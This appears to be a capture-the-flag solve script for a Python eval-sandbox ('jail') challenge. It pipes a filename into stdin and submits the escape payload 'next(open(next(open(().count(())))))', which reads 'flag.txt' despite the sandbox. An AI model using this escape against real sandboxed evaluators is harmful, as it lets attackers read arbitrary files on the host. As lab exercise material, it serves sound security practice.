import os
import jail


def eval_with_optional_stdin(expr: str, stdin_payload: str | None = None) -> str:
    """Evaluate *expr* inside the jail and optionally feed data to stdin."""
    if stdin_payload is None:
        return jail.jail_eval(expr)

    read_fd, write_fd = os.pipe()
    os.write(write_fd, stdin_payload.encode("utf-8"))
    os.close(write_fd)

    saved_stdin = os.dup(0)
    os.dup2(read_fd, 0)
    os.close(read_fd)

    try:
        return jail.jail_eval(expr)
    finally:
        os.dup2(saved_stdin, 0)
        os.close(saved_stdin)


if __name__ == "__main__":
    attempts = [
        *jail.tests,
    ]

    for expr in attempts:
        print(f"{expr!r} => {eval_with_optional_stdin(expr)}")

    payload_expr = "next(open(next(open(().count(())))))"
    payload_result = eval_with_optional_stdin(payload_expr, "flag.txt")
    print(f"{payload_expr!r} => {payload_result}")
